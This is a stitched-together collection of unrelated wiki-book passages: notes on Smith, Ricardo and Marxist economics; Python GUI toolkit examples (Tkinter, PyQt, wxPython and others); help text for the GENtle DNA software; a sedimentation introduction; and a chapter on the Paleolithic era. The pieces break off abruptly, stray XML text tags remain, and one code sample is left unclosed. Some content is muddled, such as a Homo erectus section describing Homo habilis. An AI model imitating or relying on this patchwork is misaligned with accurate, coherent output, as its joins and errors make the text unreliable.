Classical Economics is a vast school of economic thought which will not be entirely discussed here. Instead, only David Ricardo and Adam Smith will be reviewed. 

Adam Smith had argued that value could not have originated in utility. He presented the counterpoint: if utility was the basis of value, how is it that water (which we need to live) is of no value compared to diamonds (which have no use at all)? He came to the conclusion that the labor used to make the commodity determines the value in exchange. 

As a general matter, Smith thought, the amount of labor required to produce the goods would determine the rate at which they could be exchanged for one another, though he mentioned some exceptions. If the supply of goods could not be increased by labor, then their value would be determined by their scarcity, and not by the labor embodied in them. Old master paintings would be a case in point -- no more could be produced, since all the old masters were dead, so the price of these paintings could rise to any height without calling forth a competing supply of new production. Monopoly would be another exception. The monopoly would be able to keep the good scarce, preventing any competing new production. The general idea seems to have been the people can always choose to produce for themselves rather than obtaining goods and services in exchange for others. If they must give up more labor to get the good by exchange, then they would produce for themselves instead.

Basically, the work of Adam Smith that is relevant to Marxism is summed up to a single proposition: Exchange Value must depend on something common to all goods; embodied labor is the one common factor on which exchange value depends. 

Ricardo essentially reformed the Labor Theory of Value so value wasn't &quot;entirely&quot; based on labor, although a large portion of value is. He theorized about the influence of machinery affecting value. Ricardo saved the labor theory of value from a serious objection. The objection had to do with land and rent. On the one hand, land rent seems to be a cost of production -- shouldn't the &quot;natural price&quot; of an agricultural product depend on the rent of land? On the other hand, labor will be more productive on land that is more fertile. Crops grown on fertile land will cost less labor. Does that mean it has less value?

I'll skip the math and come to Ricardo's conclusions. It is the labor required for production on marginal land (the next unit of land) that determines the normal price or value of agricultural products. And the surplus of production on more fertile land is &quot;absorbed&quot; by rent. Landowners don't have to do anything to earn this rent -- they get it automatically as a result of the competition for fertile land.

Ricardo fortified the Labor Theory of Value from ''most'' criticisms. There were three main vulnarable points: absolutely scarce goods, international trade, and monopoly. Marx played with these, which will be discussed later.

===French Socialism===

French Socialism can be summed up as the rejection of capitalism. All sorts of outlandish ideas have been associated with French socialism (e.g. polygamy, etc.).

French socialism is only one name of the concepts. Marx referred to them as ''utopian socialism''. Marx grounded his theory in scientific materialism (i.e. beyond physical reality there is nothing), and thus criticized the Utopian socialists for not having a basis in reality for their theories.

The utopian socialists explained that &quot;somehow&quot; everything will fit together into an ideal society. Of course they never bothered to investigate ''how'' socialism would come about. They wrote instead of ''what'' socialism is. 

This may not seem like a bad idea, but to Marx it was a grievous error. Marx explained his theory with historical materialism, which is our next topic.

== Historical Materialism ==

&quot;[People] make their own history, but they do not make it as they please; they do not make it under self-selected circumstances, but under circumstances existing already, given and transmitted from the past. The tradition of all dead generations weighs like an nightmare on the brains of the living.&quot;[2]

In the beginning, according to Historical Materialism, is material reality. A particular group of humans, living in a specific part of the world, with a unique history, a particular technology, etc. It is Marx's idea that those specific details produce a certain kind of society with certain kinds of classes, certain relationships between them. Those relationships, in turn, generate ideas, religions, cultures, etc.

So we have an &quot;orderly&quot; explanation of human society: material conditions leading to technology leading to classes leading to culture. It was Marx's observation that there were &quot;regularities&quot; over long periods of time in this process. (He called them &quot;laws&quot; because that was the custom in 19th century European science.) He saw the evolution of human society in these &quot;regularities&quot; or &quot;stages&quot; (taken from the [http://en.wikipedia.org/wiki/Mode_of_production wikipedia article]) This is the &quot;Ladder of Marxism&quot;.

1. Primitive communism. Human society organised in traditional tribe structures, typified by shared production and consumption of the entire social product. As no permanent surplus product is produced, there is also no possibility of a ruling class coming into existence. As this mode of production lacks differentiation into classes, it is said to be classless. Paleolithic and neolithic tools, pre- and early-agricultural production, and rigorous ritualised social control are the typifying productive forces of this mode of production.

2. The asiatic mode of production. This is a controversial contribution to Marxist theory, initially used to explain pre-slave and pre-feudal large earthwork constructions in China, India, the Euphrates and Nile river valleys (and named on this basis of the primary evidence coming from greater &quot;Asia&quot;). The asiatic mode of production is said to be the initial form of class society, where a small group extracts social surplus through violence aimed at settled or unsettled band communities within a domain. Exploited labour is extracted as forced corvee labour during a slack period of the year (allowing for monumental construction such as the pyramids, ziggurats, ancient Indian communal baths or the Chinese Great Wall). Exploited labour is also extracted in the form of goods directly seized from the exploited communities. The primary property form of this mode is the direct religious possession of communities (villages, bands, hamlets) and all those within them. The ruling class of this society is generally a semi-theocratic aristocracy which claims to be the incarnation of gods on earth. The forces of production associated with this society include basic agricultural techniques, massive construction and storage of goods for social benefit (grainaries).

3. The slave mode of production. It is similar to the asiatic mode, but differentiated in that the form of property is the direct possession of individual human beings. Additionally, the ruling class usually avoids the more outlandish claims of being the direct incarnation of a god, and prefers to be the decendents of gods, or seeks other justifications for its rule. Ancient Greek and Roman societies are the most typical examples of this mode. The forces of production associated with this mode include advanced (two field) agriculture, the extensive use of animals in agriculture, and advanced trade networks.

4. The feudal mode of production. It is usually typified by high feudalism in Western Europe. The primary form of property is the possession of land in reciprocal contract relations: the possession of human beings as peasants or serfs is dependent upon their being entailed upon the land. Exploitation occurs through reciprocated contract (though ultimately resting on the threat of forced extractions). The ruling class is usually a nobility or aristocracy. The primary forces of production include highly complex agriculture (two, three field, lucerne fallowing and manuring) with the addition of non-human and non-animal power devices (clockwork, wind-mills) and the intensification of specialisation in the crafts--craftsmen exclusively producing one specialised class of product.

5. The capitalist mode of production. It is usually associated with modern industrial societies. The primary form of property is the possession of objects and services through state guaranteed contract. The primary form of exploitation is wage labour (see Das Kapital, wage slavery and exploitation). The ruling class is the bourgeoisie, which exploits the proletariat. The key forces of production include the factory system, mechanised powered production, Taylorism, robotisation, bureaucracy and the modern state.

6. The socialist mode of production. Since this mode of production has not yet come into effect, its exact nature remains debatable. Some theorists argue that prefiguring forms of socialism can be seen in voluntary workers' cooperatives, strike committees, labour unions, soviets and revolutions. The socialist mode of production is meant to be a society based on workers' control of all production, with a property form equating consumption with productive labour. The key forces of production are similar to those in capitalism, but changed in their nature due to workers' control and collective management. Additionally, the merging of mental and manual labour is meant to increase the level of productivity and quality of the productive forces. The primary ruling class of this mode is meant to be the working class. The primary form of exploitation is meant to be self-exploitation - in other words, the exploitation of some people by others (the &quot;exploitation of man by man&quot;) is meant to be abolished.

7. The communist mode of production. Since it refers to the far future, it is a highly debated theoretical construct. Some theorists argue that prefiguring forms of communism can be seen in communes and other collective living experiments. Communism is meant to be a classless society, with the management of things replacing the management of people. Particular productive forces are not described, but are assumed to be more or less within the reach of any contemporary capitalist society. Despite the imminent potential of communism, some economic theorists have hypothesised that communism is more than a thousand years away from full implementation.


These are not rigid and impenetrable catagories. There were capitalists in Ancient Greece and Egypt, and elements of feudalism exist today with American Corporations.

The Marxist hypothesis is that while the ultimate cause for such changes lies in technological innovation, the means by which one social order surplants another is that of class struggle. Nomads had to physically defeat savages; early despots had to defeat nomad barbarians; feudal lords had to defeat the despots; and capitalists had to defeat the feudal lords. These were not simply military struggles; they also took place in the realm of ideas. For example, new religions were invented to &quot;justify&quot; the rise of a new kind of ruling class. New &quot;moralities&quot;, new &quot;legal&quot; concepts, new &quot;philosophies&quot;, followed. If this &quot;metahistory&quot; is more or less correct, asked Marx, what happens next? Is capitalism the &quot;end of history&quot;, or will there be another new social order?

We know the answer that Marx gave, of course. Possibly he noticed the curious trajectory that was followed: primitive equality to proto-classes to centralized despotism, then mini-despots, then a lot of mini-despots, then...advanced equality? More likely, I must admit, he probably used Hegalian dialectics to arrive at the same conclusion (Hegalian philosophy was very fashionable in Marx's youth and exerted a lasting influence on the way he approached matters).

Technologically advanced equality, which he called communism, would be the next &quot;stage&quot; of human history, and one in which classes would no longer exist at all. Moreover, like all the others, it would come into existence through class struggle with the old ruling class. To Marx, it seemed inevitable that capitalism, left to itself, would become more and more openly despotic (and with fewer and fewer significant despots) and, because of its own economic constraints, would generate crisis after crisis threatening a return to barbarism or savagry unless overthrown...by all those who were not capitalists, the working class.

== Marxist Economics ==

===On Commodities===

Commodities is to capitalism as elements are to chemistry. It is very important in capitalism. (Economics, Marx and Engels argued, is the science of capitalism).

The commodity has two values: one if its usefulness, fulfilling a need, it's called a use-value; the other &quot;expresses&quot; the use-value in relations to each other, called the exchange-value. Use-value is concerned with &quot;quality&quot;(or the character of different sorts of commodities), and exchange-value is concerned with &quot;quantity&quot;.

Here's where Marx's translation gets warped: every commodity has both forms of value. If we take away value, we are left with labor. But since we screwed around with the value, we screw around with the labor also.

Value is affected directly by labor. Marx cites the example of power-looms which decreased the labor necessary to weave by half, in effect the value of the linen decreased by half also.

There are two factors in labor: labor-power, the degree of power given by labor; and labor-time, how much time is consumed by laboring. The reason why gold is so valuable is because so much labor-time is dedicated to finding it, then labor-power to extract it. For example: Brazil around the 1820s found a rich vein of diamonds. They spent so much labor-power on the diamonds that the combined value within the next three years of the diamonds is as much as Brazil's sugar crops within one year, because the amount of labor dedicated to each respective sector created a balanced value. We determine labor through necessary labor time.

NOTE: Not all things with a use-value is created by labor, e.g. virgin soil, air, etc. A use-value can have no value. Labor is able to create value, but it is also capable of not doing so.

Marx gives the example a coat=20 yards of linen. That would mean that the coat takes 2W labor time, and the 20 yards of linen has 2W labor time. The element that allows us to say 1 coat=20 yards linen is value. Money is a commodity which is used to express value, it could be gold, cattle, etc.

Now it gets tricky... when there is a series of commodities set to be expressed through the means of gold, it is the &quot;money form of value&quot;; for example:

2 ton Iron
20 yards linen
2 coats = 3 ounces gold
1 table
x commodity A

This is the &quot;price form&quot;. Prices go up because of an increased amount of labor on the commodity, or a decreased amount on the gold. The opposite is true too.

The circulation of commodities and money is a little weird at first, but I'll try to explain it. There is the sale transaction, the commodity-money(C-M), which exchanges a commodity for money. Then there is the purchase transaction, the money-commodity(M-C), which exchanges money for commodity.

What happens is the two form the C-M-C process, the circulation of commodities; or selling in order to purchase. The equation N x P = V x S, or the number of sales(N) at the average price(P) equals the velocity, or number of transactions,(V) multiplied by the money supply(S).

This all assumes that money is not being hoarded, of course. Then money itself is a commodity. Finally, money, if based on a standard, has its standard as the universal money; that is to say, if money is backed by gold, the unvirsal money is gold.

===Transformation of Money into Capital===

The general formula for the circulation of commodities is C-M-C. The opposite is basically the same for the merchant's point of view: M-C-M. However, there is a profit to be &quot;made&quot;. If one buys 1000 yds of linen for $20, then sells it for $25, you exchange $20 for $25. So, it is M-C-M', where M'= M + M. That triangle thingy, for those who don't know, means &quot;the difference between&quot;; in this case it would mean $5 surplus-value.

There is a contradiction, though, that the value is expressed through another commodity of equal value. Yet the exchange was of unequal values! This surplus-value could be used to get more capital. Well, the difference between M' and M would be the percent which prices are affected.

Every human has labor-power. It is the only commodity which they are born with, and forced to sell in capitalism. There is a limit, however, to how much labor-power that can be expended; old age takes its toll. As Marx says: &quot;The price of the labour-power is fixed by the contract, although it is not realised till later, like the rent of a house. The labour-power is sold, although it is only paid for at a later period.&quot;

There are various GUI toolkits to start with.

==Tkinter==

Tkinter, a Python wrapper for [[Programming:Tcl | Tcl/Tk]], comes bundled with Python (at least on Win32 platform though it can be installed on Unix/Linux and Mac machines) and provides a cross-platform GUI. It is a relatively simple to learn yet powerful toolkit that provides what appears to be a modest set of widgets. However, because the Tkinter widgets are extensible, many compound widgets can be created rather easily (e.g. combo-box, scrolled panes). Because of its maturity and extensive documentation Tkinter has been designated as the de facto GUI for Python.

To create a very simple Tkinter window frame one only needs the following lines of code:

&lt;source lang=&quot;python&quot;&gt;
import Tkinter

root = Tkinter.Tk()
root.mainloop()
&lt;/source&gt;

From an object-oriented perspective one can do the following:

&lt;source lang=&quot;python&quot;&gt;
import Tkinter

class App:
   def __init__(self, master):
      button = Tkinter.Button(master, text=&quot;I'm a Button.&quot;)
      button.pack()

if __name__ == '__main__':
   root = Tkinter.Tk()
   app = App(root)
   root.mainloop()
&lt;/source&gt;

&lt;/ul&gt;

==PyGTK==
''See also book [[PyGTK For GUI Programming]]''

[http://www.pygtk.org/ PyGTK] provides a convenient wrapper for the [http://www.gtk.org GTK+] library for use in Python programs, taking care of many of the boring details such as managing memory and type casting. The bare GTK+ toolkit runs on Linux, Windows, and Mac OS X (port in progress), but the more extensive features &amp;mdash; when combined with PyORBit and gnome-python &amp;mdash; require a [http://www.gnome.org GNOME] install, and can be used to write full featured GNOME applications.

[http://www.pygtk.org/ Home Page]

==PyQt==

PyQt is a wrapper around the cross-platform [http://www.trolltech.com/products/qt Qt C++ toolkit]. It has many [http://www.riverbankcomputing.com/static/Docs/PyQt4/html/classes.html widgets and support classes] supporting SQL, OpenGL, SVG, XML, and advanced graphics capabilities.
A PyQt hello world example:
&lt;source lang=&quot;python&quot;&gt;
from PyQt4.QtCore import *
from PyQt4.QtGui import *

class App(QApplication):
    def __init__(self, argv):
        super(App, self).__init__(argv)
        self.msg = QLabel(&quot;Hello, World!&quot;)
        self.msg.show()

if __name__ == &quot;__main__&quot;:
    import sys
    app = App(sys.argv)
    sys.exit(app.exec_())
&lt;/source&gt;

[http://www.riverbankcomputing.co.uk/pyqt/ PyQt] is a set of bindings for the cross-platform [[Qt]] application framework. PyQt v4 supports Qt4 and PyQt v3 supports Qt3 and earlier.

==wxPython==

Bindings for the cross platform toolkit [http://www.wxwidgets.org/ wxWidgets]. WxWidgets is available on Windows, Macintosh, and Unix/Linux.
&lt;source lang=&quot;python&quot;&gt;
import wx

class test(wx.App):
    def __init__(self):
        wx.App.__init__(self, redirect=False)

    def OnInit(self):
        frame = wx.Frame(None, -1,
                         &quot;Test&quot;,
                         pos=(50,50), size=(100,40),
                         style=wx.DEFAULT_FRAME_STYLE)
        button = wx.Button(frame, -1, &quot;Hello World!&quot;, (20, 20))
        self.frame = frame
        self.frame.Show()
        return True

if __name__ == '__main__':
        app = test()
        app.MainLoop()
&lt;/source&gt;
* [http://wxpython.org/ wxPython]

==Dabo==

Dabo is a full 3-tier application framework. Its UI layer wraps wxPython, and greatly simplifies the syntax.
&lt;source lang=&quot;python&quot;&gt;
import dabo
dabo.ui.loadUI(&quot;wx&quot;)

class TestForm(dabo.ui.dForm):
	def afterInit(self):
		self.Caption = &quot;Test&quot;

==pyFltk==

[http://pyfltk.sourceforge.net/ pyFltk] is a Python wrapper for the [http://www.fltk.org/ FLTK], a lightweight cross-platform GUI toolkit. It is very simple to learn and allows for compact user interfaces.

The &quot;Hello World&quot; example in pyFltk looks like:

&lt;source lang=&quot;python&quot;&gt;
from fltk import *

window = Fl_Window(100, 100, 200, 90)
button = Fl_Button(9,20,180,50)
button.label(&quot;Hello World&quot;)
window.end()
window.show()
Fl.run()
&lt;/source&gt;

==Other Toolkits==
* [http://www.riverbankcomputing.co.uk/pykde/index.php PyKDE] - Part of the kdebindings package, it provides a python wrapper for the KDE libraries.
* [http://developer.mozilla.org/en/docs/PyXPCOM PyXPCOM] provides a wrapper around the Mozilla [http://developer.mozilla.org/en/docs/XPCOM XPCOM] component architecture, thereby enabling the use of standalone [http://developer.mozilla.org/en/docs/XUL XUL] applications in Python. The XUL toolkit has traditionally been wrapped up in various other parts of XPCOM, but with the advent of [http://developer.mozilla.org/en/docs/XULRunner libxul and XULRunner] this should become more feasible.

[[image:GENtle_silent_mutation.png|thumb|The silent mutation dialog]]
This dialog can find restriction enzymes that cut in a marked DNA sequence (context menu ''Selection/Show enzymes that cut here'' in the DNA module). It can also find alternate versions of the DNA which will translate into the same amino acid sequence, but contains a new restriction site (silent mutation). A chosen enzyme/mutation will appear in the sequence (DNA or primer, respectively) upon &lt;tt&gt;OK&lt;/tt&gt;.

The results can be changed by
*changing which enzyme group to search
*limiting the number of times an enzyme may cut in the whole sequence
*limiting the number of mutations needed for a restriction site to manifest (PCR module only)</text>

[[image:GENtle_enzyme_management.png|thumb|The enzyme management dialog]]
The enzyme editor for enzyme management, both globally and per DNA sequence, is divided into three lists:
#A list of enzyme groups (top right)
#A list of enzymes in that group (bottom right)
#A list of current/temporary enzymes (left)
Enzymes can be copied into/removed from the left list through the &lt;tt&gt;&lt;--Add&lt;/tt&gt; and &lt;tt&gt;Remove--&gt;&lt;/tt&gt; buttons. Enzymes can be deleted from a group (except &lt;tt&gt;All&lt;/tt&gt;) via &lt;tt&gt;Delete&lt;/tt&gt; from group, or added via &lt;tt&gt;New enzyme&lt;/tt&gt;. A double click on an enzyme name in either list shows an enzyme properties dialog.

Enzymes from the left list can be added to a new or existing group via the respective buttons. All enzymes from a group can be added to the left list, and a group can be deleted.

You can share enzyme groups with other GENtle users on your intranet via a commonly shared database. Create an enzyme group as &quot;Database name:Enzyme group name&quot;, and it will be available to everyone using that database on the next start of GENtle. Note that when creating the enzyme group, use the name of the database as it appears in your local installation (maybe &quot;Shared&quot;, &quot;Shared0&quot;, &quot;Shared (2)&quot; etc.).</text>

      <text xml:space="preserve">The '''Theory of Sedimentation''' is an interdisciplinary field of research that investigates the build up of sediments. It implies knowledge of chemical engineering, mathematics, fluid mechanics, and physics. This book tries both to give an introduction on the level of graduate students and to be a reference book for researchers and practitioners. The content reaches from the explanation of basic concepts up to the documentation of ongoing research.

== The Paleolithic Era ==
The [[w:Paleolithic|Paleolithic]] (or '''Palæolithic''') Era, is the name historians give to the time period between 2.6 million years ago, and approximately 12,000 years ago.  Historians categorize the Paleolithic Era as [[Ancient History/Glossary#Prehistory|prehistory]] because there was no written language to record events, names, dates or places.  Everything we know today about prehistory, including the Paleolithic age, is as a result of the investigations of paleo-anthropologists, archaeologists, physical and cultural anthropologists, zoologists, chemists, botanists, physicists, historians and dedicated amateurs.  It is difficult and under-appreciated work, but it is necessary if our understanding of the past is to advance.

== Hominids ==

=== ''Homo erectus'' ===
Four useful developments came about during this time. These developments were very important to the Homo habilis they helped with everyday doings including hunting and cooking. Tools, the ideas of tools, fire and shelter are the four developments that were introduced to the Homo habilis. A fifth development was language, it acted both as a cultural artifact and mental change.

=== ''Homo neanderthalensis'' ===
Neanderthal humans were a prehistoric, stone-tool using species of human, the last of which are thought to have lived 28,000 years ago.  First published in 1863 from a cave in Germany's Neander Valley,  Neanderthal remains and associated tools have since been found across Eurasia from Gibraltar to Uzbekistan.  The average adult Neanderthal was much more powerfully built than a modern adult human, with distinct facial features including low, thick brow ridges.  Neanderthals inhabited Europe during Ice Age periods, surviving extremely harsh climatic conditions which may have prompted the evolution of their stout, muscular frames.  

Neanderthals buried their dead, and even included flowers with some burials.  When ''Homo sapiens'' arrived in Europe 40,000 - 50,000 years ago, Neanderthals were present.  There has been much speculation about contact and even interbreeding between the two types of human, but genetic surveys have never found modern humans with DNA that could be matched to DNA recovered from Neanderthal remains.  It is possible that modern humans, using more refined tools and techniques for hunting, out-competed Neanderthals for food resources and brought about their extinction.

=== ''Homo sapiens'' ===
Anthropologists believe that modern man, or ''Homo sapiens'', emerged as a distinct species by about 100,000 years ago.  Extensive studies of ancient human remains and shelters seem to show that groups of ''Homo sapiens'' left Africa and entered Asia via the Middle East around 65,000 years ago. 

The first modern humans to evolve in Africa lived mainly on meat. By 70,000 years ago, they had switched to a marine diet consisting largely of shellfish. 
This new research suggests they moved along the coasts of the Arabian peninsula into India, Indonesia and Australia about 65,000 years ago. An offshoot later settled the Middle East and Asia about 30,000 to 40,000 years ago. (Ref: BBC News 13 May 2005 &quot;Early humans followed Coast&quot; )

By 35,000 to 40,000 years ago, modern humans were living across the Old World from Europe to Australia.  About 12,000 to 15,000 years ago, humans crossed into North America from Asia via Beringia, a now submerged land bridge that existed during the Pleistocene Ice Age when sea levels were lower. They rapidly spread across North and South America after the climate became warmer and the ice sheets retreated. 

Around 10,000 years ago agriculture began at sites such as Jericho and Catal Huyuk in the Fertile Crescent, an area in the Middle East between the eastern Mediterranean Sea and the Persian Gulf. These early towns and villages were generally located near sources of water for growing crops. It was not until millennia later that humans developed irrigation techniques and could grow crops using the rising and falling waters of The Fertile Crescent's twin rivers, the Tigris and the Euphrates. This period is generally accepted as the birth of modern civilization and the beginning of the nation-state.

== Hominids to Humans ==

=== Physical Changes ===
As hominids developed into humans (''Homo sapiens''), they underwent various physical changes.  Most obviously, our ancestors learned to walk upright on two legs, rather than alternating between two legs and four legs.  This straightened the spine, and moved the'' foramen magnum'' from the back of the skull to the underside.  Hominin faces flattened, and the space between the eyes narrowed, so that they could look forward and see from side to side.

Our ancestors also developed a taste for a broad variety of foods.  Early hominids, like'' Australopithicus robustus'', were clearly vegetarian plant-eaters, based on their teeth and jaw structure.  But later hominids, including ''Australopithicus afarensis'' and ''Homo erectus'', clearly used their incisors to tear meat and their molars to chew it.

=== Mental Changes ===
Mental changes in early hominins were substantial.  From ''Australopithicus afarensis'', who had barely 300 cubic centimeters of brain size, hominin heads eventually expanded to ''Homo neanderthalensis'''s impressive 1950 cubic centimeters.  At least some of this expanded brain power was shifted from processing scents to processing sights and sound.  Another substantial portion went to controlling the auditory and language functions.  Smell diminished in importance as more brain power was reserved for looking, listening and talking.

The modern ''Homo sapiens'' brain is actually smaller than ''neandethalensis'', but paleoanthropologists theorize that once the brain reached an optimum size for certain kinds of work, it began specializing, miniaturizing, and integrating.  The result is that the modern human brain may be smaller, but its critical functions are much more closely packed into a narrower space, for more efficient functioning.  In this way, the process of evolution continued in early humans.

== Technological Changes ==
The Paleolithic Era accounts for millions of years of human experience, a period many times longer than the mere ten thousand years that something resembling civilization can be said to have existed.  This first primitive era saw few changes in how humans lived.  Yet four great developments did occur which represent some of the most momentous changes in human lifestyles.  These four changes may be summarized:  the idea of a tool, a range of tools, fire, and shelter.  A fifth &quot;tool&quot;, language, acts as both a cultural artifact and a mental change.

===Tools ===
Tools seem like such a basic part of everyday life that it is hard to imagine a world without them. The computer you are using to read this book is a tool, though, and so is the desk or table on which the computer rests.  Your chair is a tool, and the electricity which powers your computer is provided by another tool, a power plant which converts other forms of energy into electrical power.  Tools, in a very real sense, are all ''artifacts'' -- objects made by human hands to serve some purpose.

In the early Paleolithic period, from about 3 million years ago until 1 million years ago, the hominids from which we arose lived much like other animals: they hunted and gathered food from natural sources, and ate only the food that was immediately edible to a human digestive system.  No one appears to have had any tools at all.  Some early hominids were vegetarian; others were meat-eaters.  Yet neither group cooked their food, consuming it raw instead. This placed significant limitations on their diets — a number of plants and animals cannot be consumed and digested raw.  

About two million years ago, our predecessor, a hominid known as ''Homo habilis'' used his hands with opposable thumbs to construct a crude tool from stone.  This tool, called a ''hand axe'' was about the size of a modern adult male's fist, bi-faced, with a sharp point. The hand axe was used for breaking open bones to scoop out the rich marrow inside, a popular food item among hominids. No doubt, the same tool served as a weapon as well.

The hand axe was formed by taking a nodule of flint, and gradually breaking away all the pieces of flint which did not match the shape of the ideal hand-axe.  This process is called ''core-formed flint-knapping'', because it takes a lump of flint and gradually disposes of all of the flint which does not match the desired shape.  

''Homo habilis'' and his relatives made core-formed hand axes for a million years before a new group of hominids, ''Homo erectus'', hit upon a new technology which reverberates to the present day.  Before ''Homo erectus'', there was only one tool in the world, and it was a hand axe.  However, ''Homo erectus'' hit upon a new method for producing hand axes.  Instead of chopping away at a flint nodule until it looked like a hand axe, the new tool-makers would knock a piece of flint off a core, and then shape the splinter, or ''flake'' to the desired shape.  This process created numerous ''microliths'', or sharp pieces of flint or chert, which could be used as small knives or as scrapers on hides or bone.  

The development of ''flaking'', or using smaller chips from a flint nodule rather than the main core of the nodule, spread rapidly.  Within 100,000 years, nearly all peoples in the world were using the new technique for making hand axes.  Something else interesting happened as well.  As the technique of flaking spread, new forms of flaking appeared as well.  No longer were hominids making only hand axes.  They began creating a whole series of new tools out of flint and quartzite and chert and obsidian:  burins, or drills, for putting holes in wood; awls for punching holes in leather; scrapers for cleaning the meat off of hides and bones; knives for cutting meat or vegetables; points for spears (and later still, arrows); and chisels for working stone, wood and bone.

==== Tool Specialization ====
Archaeologists would say that the denizens of the late Paleolithic had begun to ''specialize''.  Specialization in a historical context means the development of new forms to accommodate new activities.  The hand axe had been a sufficient tool when everyone in the world was interested in collecting marrow from the insides of bones.  However, around one million years ago, there was an explosion of new tool types, ranging from needles to drills to knives.

The increasing number of tool types suggests to archaeologists that there was also an explosion in the number and types of human activity.  Why make a needle, if there is no thread to use with it?  Why make a needle, if you have no cloth or leather to sew together?  The presence of so many tools shows that hominids were opening oysters with finesse, instead of simply smashing the shells.  They were sewing leather or plant material together, to make baskets and bags and clothing.  They were drilling holes in wood, to make houses or boats.  They were scraping hides because they wished to make leather.  They were making knives to use in their kitchen areas because they were making more complex types of food.  They were making spears because they were hunting large animals -- and defending themselves against human predators as well.

==== Perishable Tools ====
Other types of tools show up in the late Paleolithic age.  It is hard to tell what they are, however, because many of these tools are made of perishable materials such as wood, bone, leather and cloth.  We can guess at their existence today only by hints.  If a bone fishing hook appears at an archaeological site, we can presume they had fishing line, perhaps made out of vegetable fibers.  If a stone with a specific shape and a hole in it is found, scientists can guess at the existence of a spinning spindle, to make thread.  The presence of beads in patterns in a grave suggests thread for the beads to be strung upon, or even clothing for the beads to be sewn on.  It is hard to make generalizations about the existence of baskets in the Paleolithic period, but people must have made nets, baskets and bags for carrying food and fruit, and catching fish, at many places around the world.

=== Fire ===
Sometime between 300,000 and 1.5 million years ago, humans also tamed fire.  Taming fire may not be the same as controlling it.  Some scientists believe that the hominid ''Homo erectus'' stumbled upon a lightning-struck tree or a forest fire, and captured a few coals in a basket, a bag or an animal horn.  It may not have been able to put out the fire and re-start it, but it at least had some coals from which it could keep a hearth fire alive.

''Homo erectus'' used fire in a number of interesting ways.  First, their overnight stops now included a warm and welcoming light at the center and a fire that kept animals at bay.  Second, that warm and welcoming light also provided enough heat to cook food.  New plants and animal foods became open to humans for the first time as a result of this tamed fire.  Third, the heat and light on a torch could be used to start large fires, and drive animal prey towards a trap or ambush site.  ''Homo habilis'' could now catch a lot more food on the hoof.  Fourth, the same fire could be used to drive away predators.  It made camps safer, and it gave hominids a new tool for defeating rivals who ate the same animals.  Finally, fire probably stimulated the creation of language.  As early peoples sat around the fire, they would have enacted stories from their family history, and discussed new tool types.  At first, these conversations may have been mere gestures accompanied by grunts, perhaps boastful males re-enacting their daring deeds of the day.  However, over dozens or hundreds of generations, hominids would have developed strong speech centers in the brain, which would make word banks and grammars possible.  The existence of many language families in the world today is one strong argument for the independent development of language. Language seems inherently human, a process linked to thinking and the development of reason.

Yet all of these many benefits of fire would be canceled if the people failed to keep their fire fed.  The coals would go out, and all the benefits of having fire would be lost, for the hominids had no way to restart the flame once it was extinguished and the coals turned to ash.

====Controlling Fire ====
Sometime between 500,000 and 1 million years ago, one of the hominids (probably ''Homo erectus'') discovered that some stones gave off sparks when they were struck together.  They also discovered that friction can produce heat, and heat can produce sparks which then generate flame.  Four techniques developed for mastering friction and sparks.  The first of these simply involved jamming one stick into a groove in another stick, and rubbing back and forth until the friction produced a spark or a flame.  The second method, the drill method, involves twirling one stick against another until the heat produced generates a spark or a flame.  Bow-drilling, the third method, involves using a bow with a cord strung around the vertical stick, to speed the friction and increase the likelihood of flame.  The fourth method requires a naturally occurring ferrous metal and a piece of flint; when the two are struck together, the resulting sparks can start a fire.

With four methods for generating fire, hominids no longer needed to fear the loss of their coals.  Bowdrilling or stick rubbing were slow and inefficient ways of starting a fire, but they worked reliably and well.  Now hominids really controlled fire, because they could let it go out, and start it again, whenever they needed and wherever they wanted.  It was likely considered an almost magical process.  The Greek myth of Prometheus attributes almost mystical power to the ability to control fire, and declared that the wrath of the gods must surely fall on one who knew such secrets.

=== Clothing ===
The third technological shift represents the development of shelter and clothing.  Most clothing is made out of perishable materials like leather and cloth, which readily decay in the ground after only short periods of time.  Modern scientists can only postulate the existence of clothing in the Paleolithic Age from the existence of needles and other tools for sewing and preparing hides.  Archaeologists find one possible sign of clothing in the Paleolithic era, though:  in some very ancient grave sites, a thin layer or halo of colored earth surrounds the skeleton.  Most scholars believe this red ocher residue to be the remnants of paint smeared on the body.  However, some believe this colored earth to be the remains of clothing at burial.

Certainly, later Neanderthal man (Homo neanderthalensis) started burying their dead.  The graves tend to be very simple.  Often the dead person is buried in a fetal position, suggesting the same shape in death as the infant at birth.  Flowers are often scattered in the grave, along with strands of beads and a few simple tools.  The custom of burying someone with ''[[Ancient History/Glossary#Grave goods|grave goods]]'' remains a consistent part of human life in many places even today.

=== Shelter ===
Most early hominids probably lived in the open air, near to sources of food and water.  They chose locations that could be defended against predators and rivals and that were shielded from the worst weather. Many such locations could be found near rivers, lakes and streams, perhaps with low hilltops nearby that could serve as refuges in troubled times.  Since water can erode and change landscapes quite drastically, both in the course of ordinary motion and catastrophe, many of these campsites are utterly destroyed, and not even skilled archaeologists can find them, much less reconstruct them.  Our understanding of Paleolithic dwellings is thus necessarily limited.

Even so, a few examples of Paleolithic houses exist, although they only come to light very recently in the Paleolithic era, no more than 200,000 years ago.  These &quot;houses&quot; are more frequently campsites within caves or in the open air, with little in the way of formal structures for living in.  However, as the Paleolithic era progressed, dwellings became more sophisticated, more elaborate, and more house-like.  The oldest examples are shelters within caves, followed by houses of wood, straw and rock; a few examples exist of houses built out of bones.

==== Caves ====
Caves are the most famous example of Paleolithic shelter, though the number of caves used by Paleolithic peoples is drastically small compared with the number of hominids thought to have lived on earth 500,000 years ago.  Most hominids probably never entered a cave in their lives, much less lived in one.  Nonetheless, the remains of hominid settlement show interesting patterns.  In one cave, a tribe of ''Homo neanderthalensis'' kept a hearth fire burning for a thousand years, leaving behind an accumulation of coals and ash.  In another cave, post holes in the dirt floor reveal that the residents built some sort of shelter or enclosure with a roof to protect themselves from water dripping on them from the cave ceiling.   They often used the rear portions of the cave as ''[[Ancient History/Glossary#Middens|middens]]'', depositing their garbage in the back of the cave.

In the later, more recent Paleolithic period, about 125,000 years ago, caves ceased to act as houses.  Instead, they became religious or magical places for early peoples to gather for [[Ancient History/Glossary#Ritual|ritual]] purposes.  Caves, such as Lascaux in France and Altamira in Spain, became art galleries filled with elaborate images of horse, bison, buffalo, mammoths and other animals.  Lit by flickering firelight, these images appeared to move and come alive.  Archaeologists do not know whether ancient peoples worshiped these images or used them for the purpose of working magical spells on the animals they hunted.  Modern visitors to such caves are awed by the beauty of these ancient artworks, even so.

